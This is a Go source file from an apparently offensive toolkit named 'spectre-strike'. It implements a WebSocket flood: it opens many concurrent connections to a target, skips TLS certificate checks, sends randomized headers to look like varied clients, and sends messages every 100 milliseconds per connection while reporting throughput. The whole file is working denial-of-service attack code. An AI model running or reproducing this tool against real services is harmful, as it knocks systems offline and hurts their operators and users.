package attacks

import (
	"fmt"
	"net/url"
	"sync"
	"sync/atomic"
	"time"

	"spectre-strike/pkg/utils"

	"github.com/fatih/color"
	"github.com/gorilla/websocket"
)

type WebSocketConfig struct {
	Target      string
	Duration    time.Duration
	Connections int
}

type wsStats struct {
	active   int64
	total    int64
	messages int64
	errors   int64
}

func LaunchWebSocketFlood(config WebSocketConfig) error {
	parsedURL, err := url.Parse(config.Target)
	if err != nil {
		return fmt.Errorf("invalid WebSocket URL: %v", err)
	}

	if parsedURL.Scheme != "ws" && parsedURL.Scheme != "wss" {
		return fmt.Errorf("invalid scheme: must be ws:// or wss://")
	}

	stats := &wsStats{}
	done := make(chan bool)
	var wg sync.WaitGroup

	// Start statistics reporter
	go reportWSStats(stats, config.Duration)

	// Launch WebSocket connections
	for i := 0; i < config.Connections; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			maintainWSConnection(config.Target, stats, done, id)
		}(i)
		time.Sleep(10 * time.Millisecond)
	}

	// Wait for duration
	time.Sleep(config.Duration)
	close(done)

	// Wait for cleanup
	wg.Wait()

	return nil
}

func maintainWSConnection(target string, stats *wsStats, done chan bool, id int) {
	defer atomic.AddInt64(&stats.active, -1)

	dialer := websocket.DefaultDialer
	dialer.TLSClientConfig.InsecureSkipVerify = true

	headers := utils.GenerateRandomHeaders("")
	wsHeaders := make(map[string][]string)
	for key, value := range headers {
		wsHeaders[key] = []string{value}
	}

	conn, _, err := dialer.Dial(target, wsHeaders)
	if err != nil {
		atomic.AddInt64(&stats.errors, 1)
		return
	}
	defer conn.Close()

	atomic.AddInt64(&stats.active, 1)
	atomic.AddInt64(&stats.total, 1)

	// Message payloads
	messages := []string{
		`{"type":"ping","data":"keep-alive"}`,
		`{"type":"message","data":"` + utils.RandomString(100) + `"}`,
		`{"type":"request","data":{"action":"fetch","resource":"` + utils.RandomString(50) + `"}}`,
		`{"type":"update","data":{"id":"` + utils.RandomString(20) + `","value":"` + utils.RandomString(80) + `"}}`,
	}

	ticker := time.NewTicker(100 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-done:
			return
		case <-ticker.C:
			// Send message
			msg := messages[id%len(messages)]
			err := conn.WriteMessage(websocket.TextMessage, []byte(msg))
			if err != nil {
				atomic.AddInt64(&stats.errors, 1)
				return
			}
			atomic.AddInt64(&stats.messages, 1)

			// Try to read response (non-blocking)
			conn.SetReadDeadline(time.Now().Add(10 * time.Millisecond))
			_, _, _ = conn.ReadMessage()
		}
	}
}

func reportWSStats(stats *wsStats, duration time.Duration) {
	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()

	startTime := time.Now()
	lastMessages := int64(0)

	for range ticker.C {
		elapsed := time.Since(startTime)
		if elapsed >= duration {
			break
		}

		active := atomic.LoadInt64(&stats.active)
		total := atomic.LoadInt64(&stats.total)
		messages := atomic.LoadInt64(&stats.messages)
		errors := atomic.LoadInt64(&stats.errors)

		messagesPerSec := float64(messages-lastMessages) / 3.0
		lastMessages = messages

		remaining := duration - elapsed
		color.Cyan("   📊 Active: %d | Total: %d | Messages: %d (%.0f/s) | Errors: %d | Remaining: %s",
			active, total, messages, messagesPerSec, errors, remaining.Round(time.Second))
	}
}
